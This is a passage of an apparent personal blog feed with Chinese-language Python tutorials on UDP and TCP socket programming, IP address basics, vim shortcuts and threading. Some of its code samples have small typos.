</span>str_b = string.encode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str_b</span><br><span class="line"><span class="string">b&#x27;hello&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(str_b)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="服务端">服务端</h2><p>如果只需要发送消息,那只需要随机端口即可.但如果需要接收消息的话（即：服务端），需要绑定固定的端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="comment"># 1. 创建套接字</span></span><br><span class="line">udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 绑定本地信息</span></span><br><span class="line">local_addr = (<span class="string">&#x27;&#x27;</span>, <span class="number">7788</span>)</span><br><span class="line">udp_socket.bind(local_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="comment"># 3. 接收数据</span></span><br><span class="line">recv_data = udp_socket.recvfrom(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># recv_data 这个变量中存储的是一个元组(接受到的数据,(发送方的 ip, port))</span></span><br><span class="line">recv_msg = recv_data[<span class="number">0</span>]  <span class="comment"># 存储接收到的数据</span></span><br><span class="line">send_addr = recv_data[<span class="number">1</span>]  <span class="comment"># 存储发送方的地址信息.</span></span><br><span class="line">msg_decode = recv_msg.decode(<span class="string">&quot;gbk&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> msg_decode == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment"># 4. 打印接收到的数据</span></span><br><span class="line"><span class="comment">#print(recv_data)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s:%s&quot;</span> % (<span class="built_in">str</span>(send_addr), msg_decode))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 关闭套接字</span></span><br><span class="line">udp_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>bind 函数绑定本地 ip 以及端口,如果一个网络程序不绑定,则系统会随机分配.</p><p>bind 函数的参数也是一个 ip port 元组,其中本地 ip的话,就直接写一个空的字符串即可. 表示本地的任意一个 ip.绑定信息的时候必须绑定自己电脑的 ip 以及 port,绑定别的电脑的不行.</p><p>recv_data 这个变量中存储的是一个元组(接受到的数据,(发送方的 ip,port))。</p><p>一般我们接收到数据后，将 recv_data[0] 使用 decode 从 bytes 解码为string， 将 recv_data[1] 直接强制转换为字符串打印出来。</p><p>当对方发送数据过来时，操作系统先使用缓冲区存储起来，应用程序 recvfrom取数据的时候，才会从缓冲区取出数据。这样就容易造成缓冲区溢出。所以一般我们的应用程序如果要接收数据，一般都使用while True 接收（recvfrom 在数据没有到来的时候,会堵塞在那里）</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python TCP编程</title>
      <link href="/blog/2019/08/31/programming/python/3.network_programming/03.py_tcp/"/>
      <url>/blog/2019/08/31/programming/python/3.network_programming/03.py_tcp/</url>
      
        <content type="html"><![CDATA[<h1 id="先行知识">先行知识</h1><p>TCP 是面向连接的，因此 TCP socket编程在客户端发送消息前需要创建连接。同样的，TCP的客户端与服务器之间收发的数据只有消息，没有 ip port元组，因为之前已经建立了连接。</p><p>TCP 要区分客户端与服务端，二者的编写差异较大。</p><p>with as 的适用场景：</p><p>如果你打开时没有产生异常，反而在读写文件过程中产生了异常，但是你最终还是要关闭文件的，所以你需要用try 来捕获读写过程中的异常，而 Python 使用 with便可以解决这样的问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f.write()/read()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p>上面这一段代码便可以使用 with as 写成下面的样子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xxx&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write()/read()</span><br></pre></td></tr></table></figure><p>注意：with 中不需要写 close ，它会保证关闭文件。</p><p>with open(文件名字符串，打开方式) as f</p><p>​ f.write(内容字符串)</p><p>with as 不论是否写入内容是否存在都会关闭文件。</p><p>注意：如果没有要打开的文件或打开文件报错，用 with as也没啥用了，此时，就该用 try catch 了。一般使用 with as以写的方式打开文件，因为那样，没有就会创建一个文件，在文件打开处，就不会报错。所以如果你要读文件，还是用try catch。</p><h1 id="tcp-通信模型">TCP 通信模型</h1><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/py_tcp.png" /></p><h2 id="客户端">客户端</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 1. 创建 tcp 套接字</span></span><br><span class="line">    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 创建与服务器的 TCP 链接</span></span><br><span class="line">    <span class="comment"># tcp_socket.connect((&#x27;192.168.33.11&#x27;,7989))</span></span><br><span class="line">    server_ip = <span class="built_in">input</span>(<span class="string">&#x27;请输入要链接的服务器 ip：&#x27;</span>)</span><br><span class="line">    server_port = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入要链接的服务器的 port：&#x27;</span>))</span><br><span class="line">    server_addr = (server_ip,server_port)</span><br><span class="line">    tcp_socket.connect(server_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 发送的数据/接收数据</span></span><br><span class="line">    send_data = <span class="built_in">input</span>(<span class="string">&#x27;请输入要发送的数据：&#x27;</span>)</span><br><span class="line">    tcp_socket.send(send_data.encode(<span class="string">&#x27;gbk&#x27;</span>))  <span class="comment"># tcp 发送消息使用send，而且参数只有消息，因为前面已经建立过链接了。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 关闭套接字</span></span><br><span class="line">    tcp_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>注意： TCP 使用 SOCK_STREAM， 与 UDP 不同， TCP是基于连接的，所以它只需要一开始创建一个 TCP连接，之后发送消息便不用再向 UDP 那样指定目标程序的 IP 以及端口（这也就是 TCP 的 send 函数与 UDP 的 sendto 函数的不同）。</p><p>TCP 的客户端没有必要</p><h2 id="服务端">服务端</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 1. 创建套接字</span></span><br><span class="line">    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 绑定本地信息 bind</span></span><br><span class="line">    tcp_server_socket.bind((<span class="string">&#x27;&#x27;</span>,<span class="number">45586</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 让默认的套接字由主动变被动</span></span><br><span class="line">    tcp_server_socket.listen(<span class="number">128</span>)  <span class="comment"># 为什么是 128</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;等待一个新的客户端到来...&#x27;</span>)</span><br><span class="line">        <span class="comment"># 4. 等待客户端链接 accept</span></span><br><span class="line">        client_socket, client_addr = tcp_server_socket.accept()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;一个新的客户端到来：%s&quot;</span> % <span class="built_in">str</span>(client_addr))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 接收客户端发来的请求</span></span><br><span class="line">            recv_data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> recv_data:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;客户端发过来的请求时：%s&quot;</span> % recv_data.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 发送信息</span></span><br><span class="line">                client_socket.send((<span class="string">&#x27;GoodBye MyLove!&#x27;</span>).encode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 关闭客户端套接字 关闭 accept 返回的套接字意味着不会再为这个客户端进行服务。</span></span><br><span class="line">        client_socket.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;已经服务完毕！&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcp 关闭套接字, 关闭监听套接字，会导致不再等待新的客户端到来，即：xxx.aceept() 失败</span></span><br><span class="line">    tcp_server_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>TCP 的服务端必须绑定端口。TCP客户端没有必要绑定，一方面是避免固定端口与别的冲突，另一方面便于多开。</p><p>listen 使套接字变为可以被动监听，accept会进入阻塞状态，等待客户端的链接。</p><p>listen() 中的 128这个值与连接服务器的客户端的个数有一点儿关系，但是并不是绝对的，写 128256 7 10 没太大区别，具体与操作系统有关。</p><p>accept() 返回一个元组，我们直接拆包使用就行了。</p><p>recv() 返回值只有数据， recvfrom() 返回值还有 ip port</p><p>如果要一致处理请求的话，在 accept 之前 使用 while True，因为 accpet要进入阻塞状态，等待客户端连接。</p><p>TCP的服务端可以同时有多个客户端连接，但是先来的客户端先得到服务，后面的虽然连接上了，却得不到服务。tcp服务端一次只能服务一个人。</p><p>recv 会堵塞，等待客户端发送过来数据。</p><p>recv 解堵塞有两种情况:</p><ol type="1"><li>接收到了客户端的消息</li><li>客户端关闭了套接字。</li></ol><p>客户端关闭套接字，recv的返回值为空。（注：如果是客户端发送消息，发送不了空的消息。）</p><p>我们通过判断 recv 的返回值来判断客户端是否 close</p><p>if 后面可以放数字，字符串，元组，集合，字典，列表和None，True，False</p><p>数字：不是 0 成立；</p><p>字符串，元组，集合，字典，列表：非空成立</p><p>不是 None，不是 False 成立</p><p>True 成立</p><p>总结：</p><table><thead><tr class="header"><th>UDP</th><th>TCP Client</th><th>TCP Server</th></tr></thead><tbody><tr class="odd"><td>socket</td><td>socket</td><td>socket</td></tr><tr class="even"><td>bind（如果要接收消息的话）</td><td>connect</td><td>bind</td></tr><tr class="odd"><td>sendto/recvfrom</td><td>send</td><td>listen</td></tr><tr class="even"><td>close</td><td>close</td><td>accept</td></tr><tr class="odd"><td></td><td></td><td>recv/send</td></tr><tr class="even"><td></td><td></td><td>close</td></tr></tbody></table><h1 id="qq-的整体架构了解">QQ 的整体架构（了解）</h1><p>qq1 登录 tcp 连接腾讯服务器（有固定端口）</p><p>qq2 登录 tcp 连接腾讯服务器（有固定端口）</p><p>qq1 向 qq2 发消息：消息从 qq1 到达腾讯服务器，腾讯服务根据你的好友qq2 的信息，找到其 ip 和端口的套接字，然后发送到 qq2。</p><p>所以腾讯服务器充当一个转发和监视功能(emmm， 你懂得，小心说话)。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 网络编程简介</title>
      <link href="/blog/2019/08/31/programming/python/3.network_programming/01.py_socket_begin/"/>
      <url>/blog/2019/08/31/programming/python/3.network_programming/01.py_socket_begin/</url>
      
        <content type="html"><![CDATA[<h1 id="网络编程概述">网络编程概述</h1><ol type="1"><li><p>使用网络编程能够把多方链接在一起，然后可以进行数据传递。</p></li><li><p>所谓的网络编程就是，让不同的电脑上的软件能够进行数据传递，即：进程之间的通信。</p></li><li><p>ip地址，协议，端口就可以标识网络的进程，网络中的进程通信利用这个标志与其它进程进行交互</p><ol type="1"><li>所谓<code>进程</code>指的是：运行的程序以及运行时用到的资源这个整体称之为进程（在讲解多任务编程时进行详细讲解）</li><li>所谓<code>进程间通信</code>指的是：运行的程序之间的数据共享</li></ol></li></ol><p>Socket</p><p>socket(简称 <code>套接字</code>)是进程间通信的一种方式，它与其他进程间通信的一个主要不同是：</p><p>它能实现不同主机间的进程间通信，我们网络上各种各样的服务大多都是基于Socket 来完成通信的</p><h1 id="预备知识">预备知识</h1><h4 id="局域网-ip">局域网 ip</h4><p>在这么多网络 IP 中，国际规定有一部分 IP地址是用于我们的局域网使用，也就</p><p>是属于私网 IP，不在公网中使用的，它们的范围是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.0～10.255.255.255</span><br><span class="line"></span><br><span class="line">172.16.0.0～172.31.255.255</span><br><span class="line"></span><br><span class="line">192.168.0.0～192.168.255.255</span><br></pre></td></tr></table></figure><p>169 开头</p><p>169.254.X.X 是 <strong>Windows 操作系统</strong> 在 DHCP信息租用失败时自动给客户机分配的 IP 地址..</p><p>由于网络连接问题(网线问题,DHCP 服务器(其实就是Modem,路由器,或提供共享上网的主机)问题等),</p><p>而令 DHCP 信息租用失败,而 IP169.254.X.X的分配可能会令客户机(你自己的计算机,设置了"自动获取IP")与所处局域网网关(Modem,路由器,或提供共享上网的主机)位于不同的网段中,而无法与网关通信,而导致无法接入 Internet 的情况...</p><p>环回地址 127.0.0.1</p><p>严格来说 127.0.0.1 只是<strong>环回地址</strong>之一。所有 127.x.x.x都是环回地址。从 127.0.0.0 到 127.255.255.255均予以保留。此地址块中的任何地址都将环回到本地主机中。此地址块中的任何地址都绝不会出现在任何网络中。</p><p>环回地址：所有发往该类地址的数据包都应该被 loop back。正常的网络包从IP 层进入数据链路层，然后发送到网络上，而发向<code>loopback</code>地址的包，直接在 IP 层短路了，也就是发到 IP层的包直接被 IP 层接收了，不再向下发送。</p><p>环回地址主要用来做回环测试，通过使用 ping 127.0.0.1测试某台机器上的网络设备，操作系统或者 TCP/IP 实现是否工作正常。</p><p>任何地址 0.0.0.0</p><p>0.0.0.0 不能 ping 通。0.0.0.0就是任何地址<code>IP_ADDR_ANY</code>，任何地址的意思就是包括环回地址。</p><p>任何地址<code>IP_ADDR_ANY</code>的意思也就是，不管主机有多少个网口，多少个IP，如果监听本机的 0.0.0.0 上的端口，就等于监听机器上的所有 IP端口。数据报的目的地址只要是机器上的一个 IP 地址，就能被接受。</p><p>以上两段出自下面的<code>本机IP地址、 127.0.0.1 和 0.0.0.0 的区别</code>参考文章，写的挺好的，感觉没什么要改的。</p><p>0 端口：</p><p>端口号 0 是一个预留的端口号，代表的意思就是它在 TCP 或者 UDP网络传输中应该不会被用到。但是在网络编程中，尤其是在 unix socket编程当中，它有一些特殊的含义。在 unix socket 编程当中，端口号 0是一种由系统指定动态生成的端口。</p><h1 id="套接字的使用">套接字的使用</h1><p>套接字的使用流程和文件的使用流程很类似</p><ol type="1"><li><p>创建套接字</p><p>在 Python 中使用 socket 模块的函数 socket 便可以完成</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inport socket</span><br><span class="line">socket.socket(AddressFamily, Type)</span><br></pre></td></tr></table></figure></p><ul><li>Address Family：协议族，代表你选择 IPv4 还是 IPv6（IPv4 对应参数AF_INET， IPv6 对应参数 AF_INET6）。可以选择 AF_INET（用于 Internet进程间通信） 或者 AF_UNIX（用于同一台机器进程间通信）,实际工作中常用AF_INET</li><li>Type：套接字类型（传输协议类型，TCP 或 UDP），可以是SOCK_STREAM（流式套接字，主要用于 TCP 协议）或者SOCK_DGRAM（数据报套接字，主要用于 UDP 协议）</li></ul></li><li><p>使用套接字收/发数据</p></li><li><p>关闭套接字</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建 tcp 的套接字</span></span><br><span class="line">s = socket.socket(socket.AE_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#或创建 udp 套接字</span></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#...这里是使用套接字的功能（省略）。。。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不用的时候，关闭套接字。</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>如果报错</p><blockquote><p>SyntaxError:Non-ASCII character '' in file</p></blockquote><p>那你是用 Python 2 运行的，而且没有加编码。你需要使用 Python 3运行。</p><p>注意：你的 python 代码下不要新建与你导入的库名字一样的 py文件，否则会优先导入它。</p><h1 id="编程规范">编程规范</h1><p>代码不是从第一行开始写的,而是首先写入口函数，然后使用到什么，再去引入什么模块或库。</p><p>编程时先写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>  __name__==<span class="string">&#x27;__main__&#x27;</span></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>然后再去上面写函数</p><p>开发中写函数名如果遇到 to 一般写为 2</p><p>注释规范:</p><ol type="1"><li>如果注释在一行的行头,直接写 #,然后空一个空格,再写</li><li>如果在一行的代码后面, 那么首先要空两格空格,然后写 #,再空一格空格写注释.</li></ol><p>函数与函数之间要空两行,第一个函数与前面也要空两行.</p><p>写函数时，要想想其需不需要参数。</p><p>Windows 默认编码 GBK , 所以我们对从 Windows 收到的数据要使用 GBK解码.</p><p>Mac 或 Linux 使用 utf-8 即可</p><p>发送数据不需要绑定端口,系统会随机分配一个端口,但是接收方需要绑定端口,才能正确地收到数据.</p><p>所以如果你想即发消息又收消息,那你需要绑定端口.</p><p>一个套接字可以同时收发数据， 即：socket 套接字是全双工.</p><p>单工: 收音机等, 只能进行一个方向的动作</p><p>半双工: 可以双向走,但同一时刻只能有一个方向</p><p>全双工: 同一时刻既可以收又可以发.</p><h1 id="ubuntu-python-编程杂记">Ubuntu python 编程杂记</h1><p>Ubuntu 上有 ipython 3 是 python 交互模式的增强版，支持 Linux命令(清屏,补全等)</p><p>vim 快捷键 按下 V,上下选中,shift &lt; 或 shfit &gt;</p><p>跳到指定行: 切换到命令模式,然后 输入行号,再输入大写的 G(即: shift +g)</p><p>从命令模式到编辑模式:</p><p>大写的 i 是调到行首, 大写的 a 是跳到行尾.</p><p>Ctrl + shift + t : 再开一个终端标签页</p><p>复制剪切粘贴的快捷键</p><p>如果要在打开 vim 将鼠标定位到错误行,那在打开命令后: [空格]+行号</p><p>如果使用 vim 直接 vim回车，没有写文件名，那保存的时候使用一下命令然后回车。</p><p>:w 名字</p><p>如果你想要在文件名中使用括号，那么需要使用反斜杠转义。</p><p>参考资料：</p><blockquote><p><a href="https://www.jianshu.com/p/ba8abad56ba9">本机 IP 地址、127.0.0.1 和 0.0.0.0 的区别</a></p><p><a href="https://github.com/lhchen74/python-note">python-note</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python多线程基础</title>
      <link href="/blog/2019/08/30/programming/python/py_multithreading/"/>
      <url>/blog/2019/08/30/programming/python/py_multithreading/</url>
      
        <content type="html"><![CDATA[<h1 id="原理">原理</h1><p>并行与并发：</p><p>并行是真正的多任务一起执行，一个任务占用一个 CPU 核、CPU的核心数大于等于任务数。</p><p>并发；是假的多任务，采用时间片轮转（一个时间片里面每个进程轮流运行一段时间。）和优先级调度（音视频等优先级较高）</p><p>CPU 的核心数小于任务数</p><p>线程：</p><blockquote><p>线程（英语：thread）是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。</p></blockquote><p>线程函数不能有返回值：</p><p>有以下几段文字参考：（虽然看完还是有点迷糊，但是比不看好了一些）</p><blockquote><p>线程的执行本身是一个异步过程，当线程结束时，程序已经不是调用处的状态了。</p></blockquote><blockquote><p>一般情况需要用线程的话都是异步的，如果是需要等待返回值做处理的情况大部分都是同步的不需要用到多线程(除非是响应式，即线程执行完了，然后促发某个方法来处理某个结果)，这种情况的话最好是单独设置一个静态变量来记录这个值，不是用返回值这种概念来做的。</p></blockquote><blockquote><p>这是目前最主流的获取线程数据的方法。使用 Queue库创建队列实例，用来储存和传递线程间的数据。Python的队列是线程安全的，也就是说多个线程同时访问一个队列也不会有冲突。Python队列有三种 FIFO 先进先出，FILO先进后出（类似栈），优先级队列（由单独的优先级参数决定顺序）。使用队列可以实现简单生产者 – 消费者 模型</p></blockquote><h2 id="threading-模块">threading 模块</h2><p>Python 的 threading 模块是比较底层的模块，threading模块中有一个类叫做 Thread。</p><p>我们使用 Thread类创建一个类对象，将来我们就用这个对象来启动一个线程。当我们调用该对象的start 方法时，该方法会调用其内部的 run 方法，来创建一个线程</p><h2 id="两种使用方法">两种使用方法</h2><h3 id="函数">函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():  <span class="comment"># 这是一个函数</span></span><br><span class="line"></span><br><span class="line">t1 = treading.Thread(target=func)</span><br><span class="line"></span><br><span class="line">t1.start()</span><br></pre></td></tr></table></figure><p>Thread 类创建一个对象（注：该类对象要传入一个 target 参数，写函数引用，即：函数名。，然后 t1 调用它的 start方法，来执行创建一个线程执行之前的 target 传入的函数 func。当创建 Thread时执行的函数（target传入的函数引用）运行结束，那么意味着这个子线程结束了。</p><p>主线程结束，程序才会结束。如果主线程不小心先结束了，那子线程也随之结束（即：主线程结束了，子线程会随之结束）。一个子线程在运行时会有一些自己的东西，主线程最后结束，便负责帮他们回收处理。</p><p>注：target 参数：只写函数名是函数引用，函数名() 是执行函数。target参数只能够传函数名，不能传类。</p><p>当调用 Thread 的时候，不会创建线程。当调用 Thread创建出来的实例对象的 start方法时，才会创建线程并使线程等待系统调用。</p><p>当 Thread 类对象调用其 start方法时，主线程会开启一个子线程，该子线程会等待系统调用，然后去执行之前类对象传入的函数引用对应的函数。至于什么时候调用是随机的，取决于系统的内核。</p><p>主线程执行完该执行的代码后，没有其他代码要执行时，会等待子线程结束之后再结束。</p><p>注：多线程中每个线程的执行顺序是不确定的。我们无法控制线程被调用的顺序，但可以通过别的方式（比如：time.sleep()）来影响线程调度的方式。</p><h3 id="类">类</h3><p>如果要使用类时，需要：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span>(threading.Thread):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">msg = <span class="string">&quot;I&#x27;m &quot;</span> + self.name + <span class="string">&#x27; @ &#x27;</span> + <span class="built_in">str</span>(i)  <span class="comment"># name 属性中保存的是当前西安沉的名字</span></span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">t = MyThread()</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>定义一个类这个类继承自 Thread 类，这个类写一个 run方法（有额外的方法随意，但是必须有 run 方法），start 方法会自动调用 run方法。run 方法执行完了，这个线程就结束了。</p><p>适合于一个线程中做的事情比较复杂，而且我分成了多个函数去做。</p><p>你可以在 run 方法中调用 self.login()、self.register()等方法来使用类中的 login 和 register 方法。</p><h1 id="常用函数">常用函数</h1><p>treading 模块中常用函数有以下几个：</p><p>首先，我们看一下：</p><blockquote><p>Note: While they are not listed below, the <code>camelCase</code>names used for some methods and functions in this module in the Python2.x series are still supported by this module.</p></blockquote><p>官方写到 Python 2.x 中驼峰式写法的函数仍被支持，即：Python 2.x中函数为 currentThread 这样，Python 3.x 又来了一种，为 current_thread这样。既然现在都 Python 3.7了，我们还是用下划线的新版吧。（说着一点，还有一个意思，就是看到currentThread 这样写的函数代码啥的要认识。）</p><h2 id="current_thread">current_thread</h2><p><strong>threading.current_thread()</strong> 返回调用当前代码的 Thread对象。如果调用者控制的线程不是通过 threading模块创建的，则返回一个只有有限功能的虚假线程对象。</p><h2 id="main_thread">main_thread</h2><p><strong>threading.main_thread()</strong></p><p>返回主线程对象，在正常条件下，主线程是 Python解释器创建开启的线程。</p><h2 id="active_count">active_count</h2><p><strong>threading.active_count()</strong>返回当前活着的<strong>Thread</strong>对象的个数。返回的数目等于<strong>enumerate()</strong>返回的列表的长度（所以就不用麻烦的使用len(threading.enumerate()) 了）</p><h2 id="enumerate">enumerate</h2><p><strong>threading.enumerate()</strong></p><p>返回当前活着的 Thread 对象的列表。该列表包括守护线程、由current_thread()创建的虚假线程对象和主线程。它不包括终止的线程和还没有开始的线程。</p><p>threading 模块中有一个enumerate()，它的返回值是一个列表，这个列表中拥有当前程序运行起来之后它创建的所有线程（包括其主线程。）</p><p>enumerate()</p><figure class="highlight python"><table><tr><td 